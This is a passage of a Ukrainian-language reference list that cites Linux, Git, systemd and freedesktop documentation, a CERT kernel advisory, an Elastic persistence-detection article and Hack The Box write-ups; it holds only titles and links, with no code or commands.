- [13] [Хуки Git](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — сторінка посібника Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — документація ядра Linux](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Асоціації MIME-застосунків](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Специфікація Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Специфікація Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Мова Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile криптографії Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: вразливість кешу сторінок Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Документація Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Документація Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Документація конфігурації Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Документація генераторів systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — інженерія виявлення загроз у Linux: механізми закріплення](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
